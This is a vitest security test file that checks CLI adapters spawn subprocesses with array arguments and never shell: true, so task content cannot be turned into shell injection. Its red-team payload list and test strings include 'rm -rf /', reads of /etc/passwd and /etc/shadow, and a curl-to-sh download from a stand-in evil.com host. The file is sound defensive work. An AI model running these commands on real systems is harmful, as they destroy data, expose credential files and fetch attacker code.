/**
 * Shell injection prevention tests for CLI adapters.
 *
 * Verifies that user-controlled task content cannot escape
 * into shell command execution (CWE-78).
 *
 * Issue #1101 — security: Shell injection prevention
 */

import { describe, it, expect } from 'vitest';
import { spawn } from 'node:child_process';

// ============================================================================
// Injection payload library (red-team)
// ============================================================================

/** Payloads safe for argv (no null bytes — Node rejects those). */
const INJECTION_PAYLOADS = [
  '; rm -rf /',
  '$(whoami)',
  '`whoami`',
  '| cat /etc/passwd',
  '&& curl evil.com',
  '\n/bin/sh',
  '$(curl http://evil.com/shell.sh | sh)',
  "'; DROP TABLE users; --",
  '${IFS}cat${IFS}/etc/passwd',
];

// ============================================================================
// spawn safety verification
// ============================================================================

describe('spawn array-mode safety', () => {
  it('passes injection payloads as literal argv', () => {
    for (const payload of INJECTION_PAYLOADS) {
      // spawn with array args treats each as a literal argv element
      const child = spawn('echo', [payload], {
        stdio: ['pipe', 'pipe', 'pipe'],
      });

      // Verify shell: true is NOT set (default is false)
      const spawnOpts = { stdio: ['pipe', 'pipe', 'pipe'] };
      expect(spawnOpts).not.toHaveProperty('shell');

      child.kill();
    }
  });

  it('rejects null bytes in argv (Node safety)', () => {
    expect(() => {
      spawn('echo', ['\x00/bin/sh'], {
        stdio: ['pipe', 'pipe', 'pipe'],
      });
    }).toThrow();
  });

  it('does not use shell: true in spawn options', () => {
    // The subprocess adapter uses this exact pattern
    const opts = { stdio: ['pipe', 'pipe', 'pipe'] as const };
    expect('shell' in opts).toBe(false);
  });
});

// ============================================================================
// Command config safety
// ============================================================================

describe('CommandConfig argument isolation', () => {
  it('task content in args is a single argv element', () => {
    const taskContent = '; rm -rf / && curl evil.com';
    const args = ['--print', '--model', 'opus', taskContent];

    // Array-based spawn: each element is ONE argv entry
    expect(args).toHaveLength(4);
    expect(args[3]).toBe(taskContent);
    // The semicolons and pipes are literal characters, not shell operators
    expect(args[3]).toContain(';');
    expect(args[3]).toContain('&&');
  });

  it('stdin content is not subject to shell expansion', () => {
    const stdinContent = '$(whoami) `id` | cat /etc/shadow';

    // When passed via stdin.write(), content is raw bytes
    const buf = Buffer.from(stdinContent, 'utf-8');
    expect(buf.toString()).toBe(stdinContent);
    // No expansion occurs — the string is preserved verbatim
  });

  it('payloads with null bytes are preserved in strings', () => {
    const payload = 'test\x00/bin/sh';
    expect(payload).toContain('\x00');
    // Node's spawn rejects these, providing an extra safety layer
  });
});

// ============================================================================
// codex adapter: no shell: true in execution path
// ============================================================================

describe('codex adapter spawn options', () => {
  it('no shell: true in codex adapter code', async () => {
    const source = await import('node:fs/promises').then((fs) =>
      fs.readFile(new URL('./adapters/codex-adapter.ts', import.meta.url), 'utf-8')
    );

    // Match shell: true only in code context (not in comments)
    // Split into lines, filter out comment lines, then check
    const codeLines = source
      .split('\n')
      .filter((l) => !l.trimStart().startsWith('*') && !l.trimStart().startsWith('//'));
    const codeOnly = codeLines.join('\n');
    const matches = codeOnly.match(/shell:\s*true/g);
    expect(matches).toBeNull();
  });

  it('no shell: true in codex MCP adapter code', async () => {
    const source = await import('node:fs/promises').then((fs) =>
      fs.readFile(new URL('./adapters/codex-mcp-adapter.ts', import.meta.url), 'utf-8')
    );

    const codeLines = source
      .split('\n')
      .filter((l) => !l.trimStart().startsWith('*') && !l.trimStart().startsWith('//'));
    const codeOnly = codeLines.join('\n');
    const matches = codeOnly.match(/shell:\s*true/g);
    expect(matches).toBeNull();
  });

  it('subprocess adapter uses array-based spawn', async () => {
    const source = await import('node:fs/promises').then((fs) =>
      fs.readFile(new URL('./subprocess-adapter.ts', import.meta.url), 'utf-8')
    );

    // Verify spawn is called with array args pattern
    expect(source).toContain('spawn(cmdConfig.command, cmdConfig.args');
    // No shell: true in the subprocess adapter
    const matches = source.match(/shell:\s*true/g);
    expect(matches).toBeNull();
  });
});
